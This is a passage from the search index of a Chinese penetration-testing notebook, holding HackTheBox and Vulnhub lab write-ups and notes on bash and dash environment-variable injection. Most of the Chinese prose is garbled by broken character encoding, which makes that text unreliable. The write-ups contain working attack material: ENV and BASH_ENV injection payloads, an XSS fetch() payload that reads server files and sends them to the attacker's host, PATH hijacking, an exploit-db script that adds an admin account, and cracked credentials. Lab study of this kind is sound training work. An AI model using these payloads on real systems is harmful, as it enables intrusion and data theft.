ENV='$(id 1>&2)' sh -i -c \"echo hello\" BASH_ENVï¼šå¯ä»¥åœ¨bash -cçš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤ BASH_ENV='$(id 1>&2)' bash -c 'echo hello' PS1ï¼šå¯ä»¥åœ¨dashæˆ–bashäº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤ PS1='$(whoami)' dash/bash å¤ç° system('command') ----> php_exec_ex() ----> php_exec() ---> linux popenå‡½æ•° ---> Linux glibcåº“ ----> sh -c echo \"command\" glibcæ˜¯gnuå‘å¸ƒçš„libcåº“ï¼Œä¹Ÿå³cè¿è¡Œåº“ã€‚glibcæ˜¯linux ç³»ç»Ÿä¸­æœ€åº•å±‚çš„apiï¼ˆåº”ç”¨ç¨‹åºå¼€å‘æ¥å£ï¼‰ï¼Œå‡ ä¹å…¶å®ƒä»»ä½•çš„è¿è¡Œåº“éƒ½ä¼šå€šèµ–äºglibcã€‚ debianç³»åˆ— sh -c echo \"command\" --> dash -c echo \"command\" # åœ¨debianç³»åˆ—shæŒ‡å‘dash æ¼æ´äº§ç”ŸåŸå›  åœ¨dashæºç ä¸­ if ( #ifndef linux getuid( ) == geteuid( ) && getgid( ) == getegid( ) S & #endif iflag ï¼‰{ // iflagä¸º-iå‚æ•°ï¼Œæ‰€ä»¥åªæœ‰ä¼ å…¥-iå‚æ•°æ‰èƒ½è¿›å…¥ä¸‹é¢çš„ifè¯­å¥ if ((shinit = lookupvar(\"ENV\")) != NULL && *shinit != '\\0') { read_profile(shinit); } } read_profile STATIC void read_profile(const char *name) { // expandstrå¯ä»¥è§£æshellå‘½ä»¤ï¼Œè§£æçš„nameå‚æ•°å°±æ˜¯ç¯å¢ƒå˜é‡ENV name = expandstr(name); if (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) payload ENV='$(id 1>&2)' dash -i -c 'echo hello' å‚è€ƒæ–‡ç«  https://www.anquanke.com/post/id/254388#h3-6 https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:05:44 "},"06.WriteUp/é¶æœº/HackTheBox--Alert.html":{"url":"06.WriteUp/é¶æœº/HackTheBox--Alert.html","title":"Hack The Box Alert","keywords":"","body":" çŸ¥è¯†ç‚¹ ä¿¡æ¯æ”¶é›† Self-XSSåˆ©ç”¨ æ¼æ´åˆ©ç”¨--ç›²æ‰“æ•°æ®å¤–å¸¦ å¯†ç ç ´è§£ é…ç½®ä¸å½“æƒé™æå‡ ç«¯å£è½¬å‘ï¼ˆå¯é€‰ï¼‰ ç›¸å…³ä¿¡æ¯ é¶æœºï¼šAlert Linux Â· Easy IPï¼š10.10.11.44 VPSï¼š10.10.16.2 æœ¬åœ°è™šæ‹Ÿæœºï¼š10.8.0.2 ç«¯å£æ‰«æ Webæ¸—é€ mdä¸Šä¼ é¢„è§ˆåŠŸèƒ½ ç™½åå•æ–‡ä»¶ä¸Šä¼ åªèƒ½ä¸Šä¼ .mdæ–‡ä»¶ï¼Œå­˜åœ¨XSS [a](javascript:alert(window.location)) ä½†æ˜¯self-xssæ²¡æœ‰å±å®³ï¼Œä¸è¿‡è¿™é‡Œå³ä¸‹è§’æœ‰ä¸€ä¸ªshareåŠŸèƒ½ï¼Œå¦‚æœå¯ä»¥åˆ†äº«ç»™ç®¡ç†å‘˜é‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œæ”»å‡» è”ç³»åŠŸèƒ½ POCæµ‹è¯• é‚£ä¹ˆå…ˆæ‹¿ä¸€ä¸ªpocæµ‹è¯•ï¼Œmdå†…å®¹ å°†è¯¥æ–‡ä»¶çš„åˆ†äº«é“¾æ¥å‘é€ç»™ç®¡ç†å‘˜ å¯ä»¥çœ‹åˆ°é¶æœºå‘é€çš„è¯·æ±‚ï¼Œè¯æ˜å¯ä»¥ä½¿ç”¨XSSæ¥è¿›è¡Œæ”»å‡» è¯»å–æ–‡ä»¶ fetch(\"http://alert.htb/messages.php?file=../../../../../../../filepath\") .then(response => response.text()) .then(data => { fetch(\"http://10.10.16.2:8888/?file_content=\" + btoa(data)); }); æ³¨æ„å¤–å¸¦æ•°æ®æœ€å¥½è¦è¿›è¡Œç¼–ç ï¼Œé˜²æ­¢ä¸åˆæ³•å­—ç¬¦ Payload filepath=/proc/self/cmdline /usr/sbin/apache2.-k.start. è·å¾—äº†æœåŠ¡å™¨çš„ä¸­é—´ä»¶ä¸ºapache filepath=/etc/apache2/sites-enabled/000-default.conf # Apache æœåŠ¡å™¨çš„é»˜è®¤è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ Apache å®‰è£…æ—¶è‡ªåŠ¨åˆ›å»ºçš„ Options Indexes FollowSymLinks MultiViews AllowOverride All AuthType Basic AuthName \"Restricted Area\" AuthUserFile /var/www/statistics.alert.htb/.htpasswd Require valid-user è·å¾—äº†æ•æ„Ÿä¿¡æ¯AuthUserFile /var/www/statistics.alert.htb/.htpasswdï¼ˆ.htpasswdç”¨äºå­˜å‚¨ Apache Web æœåŠ¡å™¨çš„ç”¨æˆ·è®¤è¯å¯†ç ï¼‰ filepath=/var/www/statistics.alert.htb/.htpasswd albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/ è·å¾—äº†ç”¨æˆ·å¯†ç å¯†æ–‡ å¯†ç çˆ†ç ´ hashcat.exe -m 1600 -a 0 \"D:\\Note\\pass.txt\" \"D:\\Global\\apps\\wordlists\\kali-master\\rockyou.txt\" ä¸»æœºæ¸—é€ ä¿¡æ¯æ”¶é›† rootæƒé™çš„php webæœåŠ¡ é…ç½®é”™è¯¯ï¼Œmonitorsç›®å½•å±äºrootï¼Œä½†æ˜¯å…¶ä»–ç”¨æˆ·å…·æœ‰å†™æƒé™ï¼Œå¯ä»¥é€šè¿‡å‘è¯¥ç›®å½•å†™å…¥æ¶æ„PHPæ–‡ä»¶è¿›è¡Œææƒ æå‡æƒé™ è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ç›‘å¬çš„æœ¬åœ°8080ç«¯å£ï¼Œè€Œphpè„šæœ¬æ–‡ä»¶éœ€è¦è®¿é—®ä¸€æ¬¡æ‰èƒ½è§£ææ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦curlè¿™ä¸ªæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œç«¯å£è½¬å‘ ssh -CfNg -L 8080:127.0.0.1:8080 albert@10.10.11.44 # é€šè¿‡albert@10.10.11.44å°†127.0.0.1:8080ç«¯å£è½¬å‘åˆ°æœ¬åœ°8080ç«¯å£ å‚è€ƒSSH ç«¯å£è½¬å‘æ•™ç¨‹ | ä¸‰ç‚¹æ°´ (lotabout.me) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-06 15:53:30 "},"06.WriteUp/é¶æœº/Vulnhub-blueç³»åˆ—.html":{"url":"06.WriteUp/é¶æœº/Vulnhub-blueç³»åˆ—.html","title":"Vulnhub--blueç³»åˆ—","keywords":"","body":"1 secret.zipæ²¡æœ‰ç ´è§£å‡ºæ¥ã€‚ dirseachç›®å½•æ‰«æç»“æœ è®¿é—®robots.txtä¸­çš„ç½‘å€ æ­Œè¯è¿åœ¨ä¸€èµ·MD5ä¸ºsshå¯†ç ï¼Œæ²¡æˆåŠŸã€‚ å¦ä¸€ä¸ªç½‘ç«™ä¸º/etc/dripispowerful.htmlï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œæ ¹æ®ä¸Šé¢çš„ç›®å½•æ‰«æåªæœ‰ä¸€ä¸ªindex.phpï¼Œå‚æ•°å°è¯•å‹ç¼©åŒ…é‡Œçš„focus on \"drip\"ã€‚ å°è¯•è®¿é—®index.php?drip=/etc/dripispowerful.htmlï¼Œè·å¾—å¯†ç å’Œä¸¤ä¸ªç”¨æˆ·å sshç™»å½• ææƒï¼ˆä¸ä¼šï¼Œçœ‹wpçš„ï¼‰ polkitææƒhttps://github.com/Almorabea/Polkit-exploit 2 ftpåŒ¿åç™»å½• wordpressç”¨æˆ·çˆ†ç ´ï¼Œåå°getshell sshå¯†é’¥ç™»å½• nmapææƒ ftpå­˜åœ¨åŒ¿åç™»å½•ï¼Œç»è¿‡éªŒè¯å‘ç°ftpä¸Šçš„secret.jpgæ— éšå†™ã€‚ wpscanç”¨æˆ·æšä¸¾ è¿›è¡Œå¯†ç çˆ†ç ´ è®¿é—®åå°æ—¶è·³è½¬ï¼Œæ·»åŠ hostè®°å½• è¿›å…¥åå° åœ¨ä¸»é¢˜çš„404æ–‡ä»¶ä¸­åŠ å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œè®¿é—®è¯¥404æ–‡ä»¶ï¼Œä¼ å…¥åå¼¹shell è¿›å…¥å®¶ç›®å½•çœ‹çœ‹ æ— æƒé™ï¼Œå°è¯•ææƒå¤±è´¥ ä½†æ˜¯è¿˜å­˜åœ¨sshå¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†sshç§é’¥ä¸‹è½½åˆ°æœ¬åœ°ï¼Œé€šè¿‡sshç™»å½•åˆ°freddieç”¨æˆ· ä½¿ç”¨pythonåœ¨.sshç›®å½•ä¸‹å¼€ä¸€ä¸ªç®€æ˜“æœåŠ¡å™¨ä¾›æœ¬åœ°ä¸‹è½½æ–‡ä»¶ã€‚ æœ¬åœ°ä¸‹è½½ä¸‹æ¥åï¼Œéœ€è¦å°†id_rsaæ”¹ä¸ºåªæœ‰400æƒé™æ‰å¯ä»¥ä½¿ç”¨ è¯»å–/root/root.txtè·å¾—ç¬¬äºŒä¸ªflagÂ· 3 sshæ—¥å¿—åŒ…å«getshell sshå¯†é’¥ç™»å½• å‘½ä»¤åŠ«æŒææƒ å‡ ä¸ªç½‘ç«™éƒ½æ˜¯ABABã€‚ã€‚ wp-adminç›®å½•åªæœ‰ä¸€ä¸ªreadme æ¶ä½œå‰§ğŸ˜¡ å›å¤´çœ‹nampçš„é»˜è®¤è„šæœ¬çš„æ‰«æï¼Œå¯ä»¥çœ‹åˆ°robots.txtä¸­ç¦æ­¢äº†ä¸€ä¸ª/eventadminsï¼Œè®¿é—® å†è®¿é—®æç¤ºctrl+aå‘ç° å†è®¿é—® ä¸€å¼€å§‹æƒ³çš„æ˜¯ç”¨ä¹å¤´è›‡è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯ç”¨æˆ·åªçŸ¥é“rootã€‚ åé¢å‘ç°ä¸è¡Œï¼Œæƒ³åˆ°æ—¥å¿—çš„ç”¨é€”ï¼Œå°è¯•è¿›è¡Œsshæ—¥å¿—åŒ…å«getshellã€‚ å› ä¸ºæ—¥å¿—ä¸­ä¼šè®°å½•sshè¿æ¥çš„ç”¨æˆ·å æ‰€ä»¥ åå¼¹shell è¿™é‡Œå’Œä¸Šä¸€ä¸ªé¶æœºä¸€æ ·ï¼Œå­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·robertjï¼Œå¹¶ä¸”www-dataæ— æ³•ææƒ æŒ‰ç…§ä¸Šä¸€ä¸ªçš„æ€è·¯æŸ¥çœ‹.sshç›®å½•ï¼Œå‘ç°ä¸ºç©º é€‰æ‹©ç›´æ¥ç”Ÿæˆsshå¯†é’¥ æŸ¥çœ‹sshé…ç½®æ–‡ä»¶ï¼šåªå…è®¸å¯†é’¥éªŒè¯æ–¹å¼è¿æ¥ï¼Œå¹¶ä¸”ç”¨æ¥éªŒè¯çš„å…¬é’¥ä¸ºauthorized_keys æ‰€ä»¥éœ€è¦å°†å…¬é’¥id_rsa.pubæ”¹ä¸ºauthorized_keys ç„¶åç”¨pythonåœ¨é¶æœºä¸Šå¼€ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œkaliä½¿ç”¨wgetå‘½ä»¤ä¸‹è½½ç§é’¥ï¼Œå¹¶ä¿®æ”¹ç§é’¥æƒé™ï¼Œæœ€åsshç™»å½• ææƒ ä¸€å¼€å§‹æƒ³ç”¨stringsæŸ¥çœ‹çš„ï¼Œä½†æ˜¯æ²¡æœ‰å®‰è£…ï¼Œé‚£å°±ç›´æ¥ç”¨ä¸€ä¸‹çœ‹çœ‹ å¯ä»¥çŸ¥é“è¿™ä¸ªå‘½ä»¤å®è´¨ä¸Šæ˜¯æ‰§è¡Œäº† ip address cat /etc/hosts uname -a é‚£ä¹ˆæˆ‘ä»¬é€‰ä¸€ä¸ªè¿›è¡Œæ„é€ å³å¯ echo \"/bin/bash\" > uname chmod 777 uname export PATH=/home/robertj:$PATH ç„¶åæ‰§è¡Œgetinfoå³å¯ 4 miscè·å¾—äººå‘˜ä¿¡æ¯ ftpçˆ†ç ´ ftp+syncæœåŠ¡ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ftpæœåŠ¡å™¨æ“ä½œç½‘ç«™æœåŠ¡å™¨ç›®å½• sshå¯†é’¥ç™»å½• å‘½ä»¤åŠ«æŒææƒ ç½‘ç«™æ³¨é‡Šè§£ç ï¼Œè®¿é—®å¦ä¸€ä¸ªç½‘ç«™ï¼Œbrainfuckè§£ç ï¼ŒäºŒç»´ç æ‰«ææœ€åå¾—åˆ°å¦‚ä¸‹ æ”¶é›†åˆ°äº†ç½‘ç«™æŠ€æœ¯äººå‘˜çš„åå­—ï¼Œå¯ä»¥å°è¯•çˆ†ç ´ftpå’ŒsshæœåŠ¡ã€‚ luther gary hubert clark sshæ— æœ ftp login: luther password: mypics å‘ç°äº†ä¸€ä¸ªç›®å½•ï¼Œç›®å½•åä¸ºhubertæ˜¯æ”¶é›†åˆ°çš„ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”uidå’Œgidä¸º1001ï¼Œè¯æ˜å…¶æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥è¯¥ç›®å½•ä¸ºhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚ å¦ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨getå‘½ä»¤ä¸‹è½½åˆ°æœ¬åœ°å å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªåŒæ­¥å®Œæˆçš„æ—¥å¿—ã€‚ æ‰€ä»¥æ ¹æ®è¿™ä¸¤ä¸ªä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æœåŠ¡å™¨ä¼šåŒæ­¥è¿™ä¸ªftpä¸Šçš„æ–‡ä»¶ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ“ä½œhubertç”¨æˆ·çš„å®¶ç›®å½•ã€‚ æˆ‘ä»¬ä½¿ç”¨putå‘½ä»¤ä¸Šä¼ è‡ªå·±çš„å…¬é’¥ éœ€è¦æ³¨æ„å…¬é’¥å ç„¶åsshè¿æ¥ çœ‹ä¸‹å®¶ç›®å½•æœ‰å•¥ è¯»å–è¿™ä¸ªrootæƒé™çš„pyæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªç½‘ç«™è¢«é»‘å®¢fricaæ”»å‡»äº†ï¼Œå¹¶ä¸”ç•™ä¸‹äº†åé—¨ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰é¢å«äººæ¥ä¿®å¤ç½‘ç«™çš„åŸå› ğŸ¤£ è¿™ä¸ªé»‘å®¢è¿˜å‘Šè¯‰æˆ‘ä»¬ä»–ç•™ä¸‹äº†æ¾æ•£çš„æƒé™ğŸ˜ è®©æˆ‘åº·åº· è¿™æ¬¡æœ‰stringså‘½ä»¤ï¼ŒæŸ¥çœ‹getinfo è·Ÿä¸Šä¸€ä¸ªé¶æœºä¸€æ · 5 wpscanç”¨æˆ·æšä¸¾ abuzerkomurcu collins gill collins satanic å¯†ç å­—å…¸ç”Ÿæˆ -m 6 æ˜¯å› ä¸ºwordpresså¯†ç æœ€å°‘6ä¸ªå­—ç¬¦ çˆ†ç ´å¯†ç  gill / interchangeable æ™®é€šç”¨æˆ·ï¼Œåå°åªæ‰¾åˆ°ä¸€å¼ å¯ä»¥å›¾ç‰‡DB åˆ†æè¿™å¼ å›¾ç‰‡ å¾—åˆ°sshè´¦å· gill 59583hello ç™»é™†åå‘ç° lost+foundç›®å½•æ— æƒé™ å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkEYFILE é€šè¿‡æœç´¢å¾—åˆ° å¯ä»¥ä½¿ç”¨johnè¿›è¡Œç ´è§£ï¼Œæœºå­GPUå¤ªåƒåœ¾äº†ï¼Œç›´æ¥ä»wpæ‹¿åˆ°å¯†ç  è·å¾—å¯†ç åï¼Œå¯ä»¥ç”¨KeePassè½¯ä»¶https://sourceforge.net/projects/keepass/æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨çº¿ç½‘ç«™ https://app.keeweb.info/æ‰“å¼€ã€‚ æ‰“å¼€åå‘ç°6ä¸ªç©ºç™½çš„key ä¸çŸ¥é“æ‹¿æ¥å¹²å˜›çš„ã€‚ã€‚ ç»§ç»­ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªkeyfolderï¼Œå¯èƒ½å°±æ˜¯è¦è®©ä¸Šé¢çš„keyæ”¾åœ¨è¿™ä¸ªkeyfolder è€Œä¸”ä½¿ç”¨pyps64ç›‘æ§è¿›ç¨‹å‘ç°æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡key.shï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚ ç»æµ‹è¯•å½“åªæœ‰ä¸€ä¸ªæ–‡ä»¶fracturedoceanæ—¶ å®šæ—¶è„šæœ¬å†…å®¹ 6 åªå¼€æ”¾äº†80ç«¯å£ æç¤ºæˆ‘ä»¬ç›®å½•æ‰«æè¦æ·»åŠ zipç±»å‹ï¼Œè¯´æ˜ç½‘ç«™ç›®å½•åº”è¯¥å­˜åœ¨zipæ–‡ä»¶ ç›®å½•æ‰«æ dirserach gobuster è®¿é—®/spammerä¸‹è½½å¾—åˆ°spammer.zip ä½¿ç”¨johnçˆ†ç ´ è§£å‹å¾—åˆ° mayer:lionheart è®¿é—®ç½‘ç«™ å°è¯•ç™»å½•è§£å‹å¾—åˆ°çš„ç”¨æˆ·ï¼ŒæˆåŠŸç™»å½• é€›äº†ä¸€åœˆå‘ç°ï¼Œé¡µé¢ç¼–è¾‘ï¼Œé‚®ç®±æ³„éœ²ï¼Œæ’ä»¶ï¼ˆæ— æ³•åŠ è½½ä½œç½¢ï¼‰ã€‚ ç½‘ç«™é…ç½® Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62) Last update: 2020-09-13 19:56:06 Site URL: 192.168.2.35/textpattern Admin URL: 192.168.2.35/textpattern/textpattern Document root: /var/www $path_to_site: /var/www/textpattern Textpattern path: /var/www/textpattern/textpattern Article URL pattern: messy Production status: testing Temporary directory path: /tmp PHP version: 5.5.38-1~dotdeb+7.1 GD Graphics Library: Unavailable Server timezone: UTC Server local time: 2023-03-07 14:40:29 Daylight Saving Time enabled?: 0 Automatically adjust Daylight Saving Time setting?: 1 Time zone (GMT offset in seconds): Asia/Baghdad (10800) MySQL: 5.5.47-0+deb7u1 ((Debian)) Database server time: 2023-03-07 08:40:29 Database server time offset: 0 s Database server timezone: SYSTEM Database session timezone: SYSTEM Locale: C Site / Admin language: en / en Web server: Apache/2.2.22 (Debian) Apache version: Apache/2.2.22 (Debian) PHP server API: apache2handler RFC 2616 headers: Server OS: Linux 3.2.0-4-amd64 Admin-side theme: hive 4.8.3 Pre-flight check: ------------------------ New Textpattern version 4.8.8 available for download. Help DNS lookup failed: 192.168.2.35 Help /var/www/textpattern/textpattern/setup/ still exists. Help Site URL preference might be incorrect: 192.168.174.159/textpattern Help Image directory is not writable: /var/www/textpattern/images Theme directory is not writable: /var/www/textpattern/themes Plugin directory is not writable: /var/www/textpattern/textpattern/plugins Help ------------------------ .htaccess file contents: ------------------------ # BEGIN Textpattern #DirectoryIndex index.php index.html RewriteEngine On # Enable the `FollowSymLinks` option below if it isn't already. #Options +FollowSymlinks #RewriteBase /relative/web/path/ RewriteCond %{REQUEST_FILENAME} -f [OR] RewriteCond %{REQUEST_FILENAME} -d RewriteRule ^(.+) - [PT,L] RewriteCond %{REQUEST_URI} !=/favicon.ico RewriteRule ^(.*) index.php RewriteCond %{HTTP:Authorization} !^$ RewriteRule .* - [E=REMOTE_USER:%{HTTP:Authorization}] AddType image/svg+xml svg svgz AddEncoding gzip svgz # For additional Apache-compatible web server configuration settings to enhance # site performance and security, we recommend: # https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess # END Textpattern ------------------------ æ–‡ä»¶ä¸Šä¼  å¯ä»¥ç›´æ¥ä¸Šä¼ ğŸï¼Œæ— ä»»ä½•é˜²æŠ¤ æ¼æ´åˆ†æï¼šhttps://blog.csdn.net/yun2diao/article/details/92765372 åå¼¹shell ææƒ ä¸Šä¼ linepeas.shæŸ¥æ‰¾å¯ææƒé¡¹ è¿™é‡ŒæŸ¥æ‰¾CVE é€‰æ‹©ä¸€ä¸ªcveè¿›è¡Œææƒï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯è„ç‰›ææƒhttps://github.com/firefart/dirtycow 7 å¼€æ”¾äº†å¾ˆå¤šç«¯å£å’ŒæœåŠ¡ï¼Œä¸åŒç«¯å£ä¸Šéƒ½æœ‰ç½‘ç«™ï¼Œæ‰€ä»¥ç›®å½•æ‰«ææ—¶éœ€è¦æ³¨æ„æ‰«å“ªä¸ªç«¯å£ 66 80 8086 80ç«¯å£ msfä¸€æ¡é¾™ 66ç«¯å£ dirsearchæ‰«æç»“æœ â€‹ å†å²å‘½ä»¤æ“ä½œ.bash_historyé‡è¦éƒ¨åˆ† wget 192.168.2.43:81/root.txt mv root.txt flag.txt nano flag.txt å¯ä»¥å‘ç°ä»åˆ«çš„ä¸»æœºä¸Šå¤åˆ¶äº†flagï¼Œå¹¶é‡åä¸ºflag.txt 8086 éƒ½æ˜¯é™æ€é¡µé¢ è¿™é‡Œçœ‹äº†wpæ­£å¸¸æ˜¯ä»66ç«¯å£ç›®å½•æ‰«æå‡º/enoç›®å½•ï¼Œä¸‹è½½å¹¶ç ´è§£zipå‹ç¼©åŒ…ï¼Œè·å¾—80ç«¯å£çš„ç”¨æˆ·å‡­è¯çš„ã€‚ã€‚ 9 ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰8 ç½‘ç«™ åªæœ‰ä¸€ä¸ªç™»å½•æ¡† sqlæ³¨å…¥å¤±è´¥ï¼Œå¼±å£ä»¤çˆ†ç ´å¤±è´¥ ç›®å½•æ‰«æ çœ‹åˆ°backupè¿˜ä»¥ä¸ºæœ‰å¤‡ä»½æ–‡ä»¶å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œä½†æ˜¯æ²¡æœ‰ï¼› è®¿é—®/admin/home.phpå°è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒï¼Œå‘ç°æ²¡æœ‰ã€‚ å¯»æ‰¾ç½‘ç«™æ¡†æ¶æ¼æ´ å°è¯•äº†ä¹‹åå‘ç°åªå­˜åœ¨rceæ¼æ´ ä½¿ç”¨ç¬¬äºŒä¸ªpyè„šæœ¬ è¿™ä¸ªè„šæœ¬å¾ˆè´´å¿ƒåœ°ç»™å‡ºäº†æœåŠ¡å™¨ä¿¡æ¯ï¼Œå¹¶è¯»å–äº†é…ç½®æ–‡ä»¶ï¼Œè·å¾—äº†claptonç”¨æˆ·çš„å‡­è¯ã€‚ å‘ç°å¤§éƒ¨åˆ†å‘½ä»¤æ˜æ˜å¯ä»¥ä½¿ç”¨çš„å´éƒ½æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥éœ€è¦åå¼¹shellåˆ°kaliï¼Œç»æµ‹è¯•å¯ä»¥ä½¿ç”¨ncè¿›è¡Œåå¼¹shell ä½¿ç”¨pythonåˆ‡æ¢ä¸ºäº¤äº’å¼shellï¼Œåˆ‡æ¢åˆ°claptonç”¨æˆ· å‘ç°claptonå®¶ç›®å½•ä¸‹æœ‰note.txt è¯»å– æç¤ºæˆ‘ä»¬ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ææƒï¼Œè¿™éƒ¨åˆ†pwnä¸ä¼š æŒ‰ç…§ä¸‹é¢æ–‡ç« ä¸­çš„æ–¹æ³•è¿›è¡Œå¤ç° https://zhuanlan.zhihu.com/p/570218595 æœ€åè´´ä¸Šå¤ç°æˆåŠŸçš„æˆªå›¾ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:54:17 "},"06.WriteUp/é¶æœº/Vulnhub-DCç³»åˆ—.html":{"url":"06.WriteUp/é¶æœº/Vulnhub-DCç³»åˆ—.html","title":"Vulnhub--DCç³»åˆ—","keywords":"","body":"DC1 ä¸»æœºå‘ç° sudo netdiscover 192.168.174.0/24 ç«¯å£æ‰«æ æŸ¥çœ‹ç½‘ç«™ åªæœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œæ‰¾å›å¯†ç åŠŸèƒ½ï¼ˆè¿™é‡Œç”¨sqlmapæ²¡æœ‰æˆåŠŸï¼‰ å¾ˆå®¹æ˜“çŸ¥é“å…¶æ˜¯Drupalç³»ç»Ÿã€‚ å¯»æ‰¾æ¼æ´ è¿™é‡Œä¼˜å…ˆä½¿ç”¨æ—¥æœŸè¾ƒæ–°ï¼Œç­‰çº§ä¸ºä¼˜ç§€çš„expï¼ˆä¹Ÿå¯ä»¥é€šè¿‡æ”¶é›†åˆ°çš„ç³»ç»Ÿç‰ˆæœ¬å¯»æ‰¾æ—¥æœŸï¼‰ å‘ç°æˆåŠŸäº†ã€‚ è·å¾—shellåçš„ä¿¡æ¯æ”¶é›† ç½‘ä¸ŠæŸ¥æ‰¾å¯çŸ¥Drupalçš„é…ç½®æ–‡ä»¶åœ¨/sites/default/settings.php,è¯»å–åå¾—åˆ°flag2å’Œæ•°æ®åº“é…ç½®ä¿¡æ¯ è¿æ¥æ•°æ®åº“ï¼Œéœ€è¦å…ˆå°†shellåˆ‡æ¢ä¸ºäº¤äº’å¼ python -c 'import pty;pty.spawn(\"/bin/bash\")' è¿æ¥åï¼ŒæŸ¥è¯¢ç”¨æˆ·è¡¨æ”¶é›†ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œadminçš„å¯†ç æ˜¯åŠ å¯†äº†çš„ã€‚è¿™é‡Œæœ‰ä¸‰ç§æ€è·¯ æš´åŠ›ç ´è§£ ä½¿ç”¨johnå¤±è´¥äº†ã€‚ ä¿®æ”¹å¯†ç  éœ€è¦æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†è„šæœ¬ã€‚ å¢åŠ ä¸€åç”¨æˆ·ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰ ä½¿ç”¨SearchSploitæŸ¥æ‰¾æ˜¯å¦æœ‰å¯¹åº”çš„è„šæœ¬ python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345 ç™»å½•å å°è¯•ææƒ $6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80 ç ´è§£æˆåŠŸåç™»å½•flag4ç”¨æˆ· ä»ç„¶ä½¿ç”¨ä¸Šé¢çš„findææƒ DC2 https://cloud.tencent.com/developer/article/1801074 ipé‡å®šå‘ï¼Œéœ€è¦æ·»åŠ hostè®°å½• cewlå¯†ç å­—å…¸ç”Ÿæˆï¼Œå¯†ç çˆ†ç ´ 7744ç«¯å£çš„sshçˆ†ç ´ rbashé™åˆ¶ gitææƒ DC3 https://blog.csdn.net/bwt_D/article/details/121291921 ä¿¡æ¯æ”¶é›†ï¼šå¾—åˆ°ç½‘ç«™CMSï¼Œä½¿ç”¨å¯¹åº”ç‰ˆæœ¬æ¼æ´expçˆ†åº“ johnå¯†ç å“ˆå¸Œçˆ†ç ´ åå°ä»»æ„æ–‡ä»¶ä¸Šä¼  å†…æ ¸ææƒ DC4 https://blog.csdn.net/weixin_44288604/article/details/108018008 ç”¨æˆ·ç™»å½•æ— é˜²æŠ¤çˆ†ç ´ rce sshçˆ†ç ´ ä¿¡æ¯æ”¶é›†ï¼šå¤‡ä»½æ–‡ä»¶ï¼Œé‚®ä»¶ï¼ˆæ³„éœ²ç”¨æˆ·å¯†ç ï¼‰ teeheeææƒ DC5 https://www.freebuf.com/sectool/259277.html æ—¥å¿—åŒ…å«getshell screenææƒ ç«¯å£æ‰«æ é€šè¿‡contactæäº¤åï¼Œé¡µé¢è¿”å›çš„é¡µè„šä¸åŒåˆ¤æ–­å‡ºåç«¯æœ‰includeå‡½æ•°åŒ…å«äº†é¡µè„šæ–‡ä»¶ã€‚ ä½¿ç”¨burpçˆ†ç ´å‚æ•° æ–‡ä»¶åŒ…å«getshell å› ä¸ºç½‘ç«™æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ 